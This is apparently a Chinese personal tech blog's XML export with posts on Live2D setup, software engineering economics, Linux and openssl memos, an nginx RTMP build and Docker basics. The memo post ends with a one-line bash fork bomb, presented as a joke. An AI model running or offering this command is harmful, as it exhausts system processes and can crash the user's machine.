#模板目录，在node_modules里</span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 150 </span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: false</span><br></pre></td></tr></table></figure><h3 id="启动hexo，会自动编译生成可用的模型文件"><a href="#启动hexo，会自动编译生成可用的模型文件" class="headerlink" title="启动hexo，会自动编译生成可用的模型文件"></a>启动hexo，会自动编译生成可用的模型文件</h3><p>目的文件live2d文件夹，编译后的文件目录如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_config.yml  live2d_models  package.json  scaffolds  themes</span><br><span class="line">db.json      node_modules   public        <span class="built_in">source</span></span><br></pre></td></tr></table></figure><h3 id="在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了"><a href="#在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了" class="headerlink" title="在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了"></a>在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;L2Dwidget.init(&#123;<span class="string">"pluginModelPath"</span>:<span class="string">"assets/"</span>,<span class="string">"model"</span>:&#123;<span class="string">"jsonPath"</span>:<span class="string">"/live2dw/assets/koharu.model.json"</span>&#125;,<span class="string">"display"</span>:&#123;<span class="string">"position"</span>:<span class="string">"right"</span>,<span class="string">"width"</span>:<span class="number">150</span>,<span class="string">"height"</span>:<span class="number">300</span>&#125;,<span class="string">"mobile"</span>:&#123;<span class="string">"show"</span>:<span class="literal">false</span>&#125;,<span class="string">"log"</span>:<span class="literal">false</span>,<span class="string">"pluginJsPath"</span>:<span class="string">"lib/"</span>,<span class="string">"pluginRootPath"</span>:<span class="string">"live2dw/"</span>,<span class="string">"tagMode"</span>:<span class="literal">false</span>&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> live2d </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件工程经济学</title>
      <link href="/2019/05/04/2019-05-04-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E7%BB%8F%E6%B5%8E%E5%AD%A6/"/>
      <url>/2019/05/04/2019-05-04-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E7%BB%8F%E6%B5%8E%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>from 华南理工大学 左保和老师<br>软件项目如何进行融资、分析风险、敏感性因素等</p><a id="more"></a><h2 id="软件工程经济学基础"><a href="#软件工程经济学基础" class="headerlink" title="软件工程经济学基础"></a>软件工程经济学基础</h2><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">requirement</span><br><span class="line">design</span><br><span class="line">constructure 详细设计和总体设计在design完成，</span><br><span class="line">testing</span><br><span class="line">maintenance</span><br><span class="line">configure management，软件团队的管理办法</span><br><span class="line">management </span><br><span class="line">tools and method</span><br><span class="line">engineering process</span><br><span class="line">quality</span><br></pre></td></tr></table></figure><h3 id="货币的时间成本，举例说明这个概念的重要性"><a href="#货币的时间成本，举例说明这个概念的重要性" class="headerlink" title="货币的时间成本，举例说明这个概念的重要性"></a>货币的时间成本，举例说明这个概念的重要性</h3><p>1、货币时间成本<br>按利率衡量<br>特定时间内 ，利息/借贷资本</p><ul><li>利息计算方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">单利 I = iP N ==&gt; 利率*存款*计息周期数</span><br><span class="line">复利 F = P（1+i）^N</span><br></pre></td></tr></table></figure></li></ul><h3 id="掌握的重要概念part1"><a href="#掌握的重要概念part1" class="headerlink" title="掌握的重要概念part1"></a>掌握的重要概念part1</h3><p>利率、利息额、借贷资本总额<br>通货膨胀率、消费者价格指数（CPI）、生产者价格指数（PPI）<br>利息的计算方法：单利、复利、计息期（一般为年，或换算为年）<br>等值计算的概念和意义（现值、折现率）<br>等额支付（等额本金、等额本息）<br>税收、营业税、增值税、营改增<br>贬值、折旧</p><h4 id="工程经济学的概念"><a href="#工程经济学的概念" class="headerlink" title="工程经济学的概念"></a>工程经济学的概念</h4><p>工程经济学是运用有效的方法对工程各种因素进行评价，确定最佳方案，做出投资决策的学科，的研究对象是工程项目。<br>对软件工程领域来说，</p><h4 id="金融学"><a href="#金融学" class="headerlink" title="金融学"></a>金融学</h4><p>明确目标周期机构<br>商业战略 管理现今流量管理</p><h4 id="会计学原理资产"><a href="#会计学原理资产" class="headerlink" title="会计学原理资产"></a>会计学原理资产</h4><p>对外投资<br>固定资产<br>货币资金<br>收入费用利润</p><h4 id="现金流量"><a href="#现金流量" class="headerlink" title="现金流量"></a>现金流量</h4><p>现金的定义</p><ul><li>指企业的库存现金和银行存款，还包括现金等价物，即企业持有的期限短、流动性强、容易转换为已知金额现金、价值变动风险很小的投资等</li><li>一项投资被确认为现金等价物必须同时具备四个条件：期限短、流动性强、易于转换为已知金额现金、价值改动风险小。</li><li>是企业财力的评价指标之一</li></ul><h4 id="现金流量图"><a href="#现金流量图" class="headerlink" title="现金流量图"></a>现金流量图</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">现金流入流出</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|_________________</span><br><span class="line">|                 时间,指财务周期</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br></pre></td></tr></table></figure><h4 id="支付方式"><a href="#支付方式" class="headerlink" title="支付方式"></a>支付方式</h4><p>等额支付</p><p>线性梯度支付<br>p=G{}<br>几何梯度支付<br>第二年 = 第一年* (1+G)</p><h4 id="通货膨胀"><a href="#通货膨胀" class="headerlink" title="通货膨胀"></a>通货膨胀</h4><p>纸币的发行量超过了流通中实际需要的数量，多余的部分继续在流通中流转，就会造成通货膨胀（百度百科）</p><h4 id="折现"><a href="#折现" class="headerlink" title="折现"></a>折现</h4><p>衡量现金流量，税收，</p><h4 id="税收"><a href="#税收" class="headerlink" title="税收"></a>税收</h4><p>营业 教育 增值</p><h3 id="基准收益率与利率的区别"><a href="#基准收益率与利率的区别" class="headerlink" title="基准收益率与利率的区别"></a>基准收益率与利率的区别</h3><p>基准收益率也被称为基准折现率。<br>区别1：和利率不同，利率是资金利息额与借贷资金额的比率；收益率是投资的回报率，利润占使用平均资金的百分比。<br>区别2：基准收益率是企业或行业或投资者以动态的观点所确定的、可接受的投资项目最低标准的受益水平，由国家发改委和建设部制定。<br>基准利率由中国人民银行制定。<br>区别3：上节讲的通货膨胀、利息等宏观因素是影响利率的主要因素；<br>而对收益率来说，商品的生产率、运维生产率，投资，不确定度、消费者的消费偏好、投资风险、物价变动等因素是主要因素，并且根据每个行业的行情变动相对利率较大。<br>软件行业的基准收益率是15%。</p><ul><li>发改委官网、国家统计局官网上找不到数据，在材料《建设项目经济评价方法与参数》上有对各行业经济的各项参数的详细介绍</li><li>部分数据参照“北京软件造价评估技术创新联盟”网站的报告，包括2016-2018年，<a href="http://www.bscea.org/Uploads/ueditor/file/20181012/5bc00c9f71b20.pdf" target="_blank" rel="noopener">2018中国软件行业基准数据报告</a></li></ul><h3 id="cpi-，-spi"><a href="#cpi-，-spi" class="headerlink" title="cpi ， spi"></a>cpi ， spi</h3><p>CPI=EV/AC，SPI=EV/PV</p><p>cpi 成本绩效指标<br>甘特图 贬值进度计划<br>进度控制指标<br>spi &lt;1  进度落后  =1 按计划进行  &gt;1 超前进行<br>开发者效率</p><h3 id="软件项目质量"><a href="#软件项目质量" class="headerlink" title="软件项目质量"></a>软件项目质量</h3><p>ISO度量</p><h3 id="软件质量保证"><a href="#软件质量保证" class="headerlink" title="软件质量保证"></a>软件质量保证</h3><p>制定推行软件工程质量标准<br>研究 采用各种技术手段<br>控制各种变更<br>制定并执行测试计划<br>按质量标准对软件质量进行度量<br>组织各种技术评审会</p>]]></content>
      
      
      <categories>
          
          <category> 软件工程经济学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>备忘的一些操作</title>
      <link href="/2019/04/17/2019-04-17-%E5%A4%87%E5%BF%98%E7%9A%84%E4%B8%80%E4%BA%9B%E7%83%A6%E4%BA%BA%E6%93%8D%E4%BD%9C/"/>
      <url>/2019/04/17/2019-04-17-%E5%A4%87%E5%BF%98%E7%9A%84%E4%B8%80%E4%BA%9B%E7%83%A6%E4%BA%BA%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>包括用linux自带openssl签postfix证书、流媒体证书按网上教程（找不到之类的问题，最后自己把证书试出来了，见第一部分，还有博客cdn换成tx云因为配置不一样导致好久没发现cdn没启用等尴尬的问题</p><a id="more"></a><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>ubuntu自带的openssl包含的证书和RSA密钥等，相当于一套封装的加密套件。</p><ul><li>based on SSL&amp;TLS</li><li>生成常用key的指令如下（很久远了，之前记下的只有几个，以后更新）</li><li>如果没有的话可以下载包ca-certificates</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public:</span><br><span class="line">openssl rsa -in rsa_private.key -pubout -out rsa_public.key</span><br><span class="line"></span><br><span class="line">private ase256加密:</span><br><span class="line">openssl genrsa -aes256 -passout pass:111111 -out rsa_aes_private.key 2048</span><br><span class="line"></span><br><span class="line">签postfix实现加密，关键的两步:</span><br><span class="line">由于Thawte_Premium_Server_CA.pem证书失效，在新的cacert包里面更换成thawte_Primary_Root_CA.pem</span><br><span class="line">cat /etc/ssl/certs/thawte_Primary_Root_CA.pem | sudo tee -a /etc/postfix/cacert.pem</span><br><span class="line">修改main.cf的smtp_tls_CAfile = /etc/postfix/cacert.pem，</span><br><span class="line">使用postmap生成用户名和密码的hash表</span><br><span class="line">重新加载/etc/init.d/postfix（postfix服务的jio本）就可以使用了</span><br></pre></td></tr></table></figure><h2 id="怪事情，opencv的cvtColor突然不能用，但是服务器上没问题"><a href="#怪事情，opencv的cvtColor突然不能用，但是服务器上没问题" class="headerlink" title="怪事情，opencv的cvtColor突然不能用，但是服务器上没问题"></a>怪事情，opencv的cvtColor突然不能用，但是服务器上没问题</h2><ul><li>解决方法找了其他源。。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install --channel https://conda.anaconda.org/menpo opencv3</span><br></pre></td></tr></table></figure></li></ul><h2 id="shell以前记的笔记"><a href="#shell以前记的笔记" class="headerlink" title="shell以前记的笔记(_ _)"></a>shell以前记的笔记(_ _)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">开头加一句#!/bin/bash 说明是一个脚本</span><br><span class="line">变量不需要声明可以直接用</span><br><span class="line">变量取值的话加美元</span><br><span class="line">If while中条件注意空格</span><br><span class="line">变量赋值不加空格</span><br><span class="line">Echo重定向：如果需要变量值和字符串相连，加大括号。</span><br><span class="line">没写i自增导致死循环</span><br><span class="line">If后一定要写fi代表结束，汇编格式吼啊</span><br></pre></td></tr></table></figure><ul><li>一个技巧，似乎是以前在用别人写的caffe库的时候出现了这个问题，忘了报什么错了，不是记得很清楚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    在Linux下编程时，或者说在一个有很多头文件互相 include 的场景中，经常会遇到不清楚一个变量</span><br><span class="line">的完整类型定义的情况（因为有用 <span class="keyword">typedef</span> 封装），从而有可能遇到编译出错。</span><br><span class="line">    例如在使用 stat 来读取文件属性的 i-node number 时，查看 stat 的手册，得知这个变量 st_ino 的变量类型是 <span class="keyword">ino_t</span>，而我们不清楚 <span class="keyword">ino_t</span>的准确定义究竟是什么。</span><br><span class="line">可以用如下方法：声明一个这样的变量即可。</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">ino_t</span> blah;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">然后运行如下指令：</span><br><span class="line"></span><br><span class="line">gcc -E test.c | grep <span class="keyword">ino_t</span></span><br><span class="line">-E 选项的意思是：在预处理过程后结束并输出到标准输出。</span><br><span class="line">文档原文如下</span><br><span class="line">-E Stop after the preprocessing stage; <span class="keyword">do</span> <span class="keyword">not</span> run the compiler proper. </span><br><span class="line">The output is in the form of preprocessed source code, which is sent to the standard output.</span><br></pre></td></tr></table></figure><ul><li>c文件生成的步骤</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C/C++文件经过预处理(preprocessing)、编译(compilation)、汇编(assembly)、和连接(linking)才能变成可执行文件。</span><br></pre></td></tr></table></figure><ul><li>查看已经建立的tcp链接数量，包括close_waite ,established,time_wait状态，</li><li>不会awk的时候感觉这是个什么东西orz</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -n | awk &apos;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&apos;</span><br></pre></td></tr></table></figure><h2 id="安装lua的时候-readline缺失"><a href="#安装lua的时候-readline缺失" class="headerlink" title="安装lua的时候 readline缺失"></a>安装lua的时候 readline缺失</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">安装一下 libreadline-dev，或者readline-dev，版本不一样有哪个装哪个</span><br></pre></td></tr></table></figure><h2 id="树莓派摄像头（非dsi口）"><a href="#树莓派摄像头（非dsi口）" class="headerlink" title="树莓派摄像头（非dsi口）"></a>树莓派摄像头（非dsi口）</h2><ul><li><p>可以这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mplayer -tv driver=v4l2:width=800:height=700:device=/dev/video1 tv://</span><br></pre></td></tr></table></figure></li><li><p>python调用的时候使用PiCamera库或者cv库，PiCamera可以测试下能不能用，毕竟两行代码，做视觉还是用cv了</p><h2 id="tx云cdn"><a href="#tx云cdn" class="headerlink" title="tx云cdn"></a>tx云cdn</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配置cdn</span><br><span class="line">源站信息： 自有源站，waynamigo.github.io</span><br><span class="line">回源配置： 回源host，waynamigo.cn</span><br></pre></td></tr></table></figure></li></ul><h3 id="发现使用shadowsocks还行，那个ssr扔了"><a href="#发现使用shadowsocks还行，那个ssr扔了" class="headerlink" title="发现使用shadowsocks还行，那个ssr扔了"></a>发现使用shadowsocks还行，那个ssr扔了</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sslocal -c /etc/shadowsocks/config.json -d start</span><br></pre></td></tr></table></figure><p>sslocal 直接用apt安装shadowsocks</p><h3 id="使用的"><a href="#使用的" class="headerlink" title="使用的"></a>使用的</h3><h3 id="流媒体搭建"><a href="#流媒体搭建" class="headerlink" title="流媒体搭建"></a>流媒体搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/arut/nginx-rtmp-module.git</span><br><span class="line"></span><br><span class="line">wget http://nginx.org/download/nginx-1.8.1.tar.gz </span><br><span class="line">tar -zxvf nginx-1.8.1.tar.gz </span><br><span class="line">cd nginx-1.8.1 </span><br><span class="line">先安装一下依赖</span><br><span class="line">yum install pcre-devel</span><br><span class="line">yum install zlib zlib-devel</span><br><span class="line">yum install openssl openssl-devel</span><br><span class="line"></span><br><span class="line">./configure --prefix=/usr/local/nginx  --add-module=../nginx-rtmp-module  --with-http_ssl_module   </span><br><span class="line">make </span><br><span class="line">make install</span><br></pre></td></tr></table></figure><ul><li>/usr/local/nginx/conf/nginx.conf</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rtmp &#123;   </span><br><span class="line">     </span><br><span class="line">    server &#123;   </span><br><span class="line">     </span><br><span class="line">        listen 1935;  #监听的端口 </span><br><span class="line">     </span><br><span class="line">        chunk_size 4000;   </span><br><span class="line">           </span><br><span class="line">            </span><br><span class="line">        application hls &#123;  #rtmp推流请求路径 </span><br><span class="line">            live on;   </span><br><span class="line">            hls on;   </span><br><span class="line">            hls_path /usr/share/nginx/html/hls;   </span><br><span class="line">            hls_fragment 5s;   </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125; </span><br><span class="line">修改server模块的</span><br><span class="line">location / &#123; </span><br><span class="line">        root   /usr/share/nginx/html; </span><br><span class="line">        index  index.html index.htm; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="git配置多用户"><a href="#git配置多用户" class="headerlink" title="git配置多用户"></a>git配置多用户</h3><p>.ssh/config</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    HostName github.com</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_qq</span><br><span class="line">    User nanamya</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd  .git</span><br><span class="line">设置本项目的用户名和邮箱</span><br><span class="line">git config user.name <span class="string">"yourname"</span></span><br><span class="line">git config user.email <span class="string">"youremail"</span></span><br><span class="line">如果重设 则：</span><br><span class="line">git config --global --unset user.name</span><br><span class="line">git config --global --unset user.email</span><br></pre></td></tr></table></figure><p>如果还是8行，检查一下，正常的话会有如下提示，否则会有debug的信息<br>ssh -vT <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a></p><ul><li>提示Hi waynamigo! You’ve successfully authenticated, but GitHub does not provide shell access.</li></ul><p>更换用户</p><h3 id="作死小能手"><a href="#作死小能手" class="headerlink" title="作死小能手"></a>作死小能手</h3><ul><li>:() { function :|:&amp; }; :</li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NeuralRecon for 3D reconstruction in real-time</title>
      <link href="/2019/04/01/2019-04-01-%E8%AF%84%E4%BC%B0%E6%A8%A1%E5%9E%8B%E7%AE%97%E6%B3%95%E6%8C%87%E6%A0%87%E7%9A%84%E8%AE%A1%E7%AE%97/"/>
      <url>/2019/04/01/2019-04-01-%E8%AF%84%E4%BC%B0%E6%A8%A1%E5%9E%8B%E7%AE%97%E6%B3%95%E6%8C%87%E6%A0%87%E7%9A%84%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> DL </tag>
            
            <tag> Object Detection </tag>
            
            <tag> Segmentation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker笔记整理（二）</title>
      <link href="/2019/03/27/2019-03-27-docker%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
      <url>/2019/03/27/2019-03-27-docker%E7%AC%94%E8%AE%B0%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>咕</p><a id="more"></a><h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><ul><li>dockerhub ： <a href>waynamigo</a><br>Let’s try a first example. Here’s a dummy equation:</li></ul><h2 id="R"><a href="#R" class="headerlink" title="R"></a>R</h2><h2 id="U"><a href="#U" class="headerlink" title="U"></a>U</h2><h2 id="D"><a href="#D" class="headerlink" title="D"></a>D</h2>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker笔记整理（一）</title>
      <link href="/2019/03/21/2019-03-21-docker%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86%E4%B8%80/"/>
      <url>/2019/03/21/2019-03-21-docker%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>基本使用方法</p><a id="more"></a><h2 id="使用docker仓库"><a href="#使用docker仓库" class="headerlink" title="使用docker仓库"></a>使用docker仓库</h2><ul><li><p>首先，docker的一个镜像是由多层组成的，每一层一个id，在pull的时候可以看到</p></li><li><p>以下面为例，imageID是镜像的唯一id，但是镜像的完整id是第三行的sha256哈希值，使用docker images 指令的时候，默认id的位数显示是截断的，可以后跟参数<strong>–no-trunc=true</strong>来显示全部</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY          TAG                 IMAGE ID</span><br><span class="line">ubuntu              latest              94e814e2efa8</span><br><span class="line">Digest: sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499</span><br><span class="line">从官方下载，默认  docker pull &lt;image&gt;:&lt;tag&gt;</span><br><span class="line">如果从第三方下载，需要在仓库前指定完整仓库地址（例如hub.c.163.com/public/&lt;image&gt;:&lt;tag&gt;）</span><br></pre></td></tr></table></figure></li><li><p>如果感觉DockerHub慢的话，可以使用镜像代理 <a href="https://registry.docker-cn.com。" target="_blank" rel="noopener">https://registry.docker-cn.com。</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/systemd/system/docker.service.d/http_proxy.conf </span><br><span class="line">[Service]</span><br><span class="line">Environment=<span class="string">"HTTPS_PROXY=https://registry.docker-cn.com"</span></span><br><span class="line">然后</span><br><span class="line">systemctl daemon-reload，先reload units，重新加载一下配置单元，再重启docker服务</span><br><span class="line">systemctlrestart docker</span><br></pre></td></tr></table></figure></li><li><p>除了docker images，还有一个docker inspect &lt;image&gt;:&lt;tag&gt; 查看详细信息(json)</p></li><li><p>docker history &lt;image&gt;:&lt;tag&gt;查看历史信息</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">&#123;</span><br><span class="line">        <span class="attr">"Id"</span>: <span class="string">"sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499"</span>,</span><br><span class="line">        <span class="attr">"RepoTags"</span>: [</span><br><span class="line">       <span class="string">"ubuntu:latest"</span></span><br><span class="line">       ]</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul><h2 id="基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等"><a href="#基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等" class="headerlink" title="基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等"></a>基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等</h2><ul><li>docker search搜索镜像，也是按关键字来的。（你搜docker search mysql可以搜到MariaDB</li><li>docker image prune -f，强删本地垃圾。<h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3></li><li>基于本地已有镜像创建，docker commit，和git格式差不多</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">格式：docker commit -m <span class="string">'message'</span> -a <span class="string">'authorname'</span> &lt;changed imageid or name&gt; &lt;yourimage&gt;:&lt;tag&gt;</span><br><span class="line">docker commit -m <span class="string">'add one file'</span> -a <span class="string">'waynamigo'</span> c4b6b5b3e7d8 myimage:waynamigo</span><br><span class="line"></span><br><span class="line">ps:另外两个参数为</span><br><span class="line">-c 执行dockerfile，在后面整理</span><br><span class="line">-p 提交时暂停容器的进程</span><br></pre></td></tr></table></figure><ul><li>基于本地模板导入（只用了OpenVZ提供的一个linux模板搞了一下，准备有时间拿上学期的floppylinux的文件弄一个镜像</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;filename&gt; | docker import - &lt;image&gt;:&lt;tag&gt;,后者为自定义的名字，导入成功后会显示镜像id</span><br></pre></td></tr></table></figure><ul><li>基于dockerfile创建镜像，下面是一个demo</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FROM centos #指定基镜像 </span><br><span class="line"></span><br><span class="line">MAINTAINER waynamigo #该镜像维护者的信息（我）</span><br><span class="line"></span><br><span class="line">COPY jdk1.8.0_79 jdk1.8.0_79 #从centos复制jdk，（竟然没有openjdk。。。还得配置环境变量</span><br><span class="line">ADD &lt;localfile&gt; # 跑了一个jar。。</span><br><span class="line"></span><br><span class="line">ENV JAVA_HOME=/jdk1.8.0_79</span><br><span class="line">ENV PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">ENV CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"></span><br><span class="line">EXPOSE 8080 #开放8080端口，其实不用写，因为jar里面已经把yml的配置打包好了</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [<span class="string">"java"</span>,<span class="string">"-jar"</span>,<span class="string">"/filename"</span>]</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 